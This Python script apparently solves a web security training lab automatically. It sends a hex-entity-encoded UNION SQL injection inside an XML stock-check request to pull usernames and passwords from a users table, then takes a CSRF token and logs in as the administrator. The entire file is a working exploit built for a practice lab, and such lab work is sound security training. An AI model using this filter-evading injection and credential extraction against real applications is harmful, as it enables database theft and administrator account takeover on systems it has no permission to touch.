import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.username = None
        self.password = None
        self.csrf = None

    @staticmethod
    def to_hex_entity(string):
        hex_entity_string = ''
        for char in string:
            hex_code = format(ord(char), 'x')
            hex_entity_string += f'&#x{hex_code};'
        return hex_entity_string

    def get_admin_username_and_password_using_sql_injection(self):
        payload = '1 UNION SELECT username || \':\' || password from users'
        payload = self.to_hex_entity(payload)
        headers = {
            'Content-Type': 'application/xml'
        }
        data = '''<?xml version="1.0" encoding="UTF-8"?>
        <stockCheck>
            <productId>1</productId>
            <storeId>{}</storeId>
        </stockCheck>'''.format(payload)
        response = self.session.post(self.lab_url + 'product/stock', headers=headers, data=data)
        for row in response.text.split('\n'):
            if 'admin' in row:
                self.username = row.split(':')[0]
                self.password = row.split(':')[1]
                break

    def get_csrf_token(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_admin(self):
        data = {
            'csrf': self.csrf,
            'username': self.username,
            'password': self.password
        }
        self.session.post(self.lab_url + 'login',  data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_admin_username_and_password_using_sql_injection()
        self.get_csrf_token()
        self.sign_in_as_admin()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
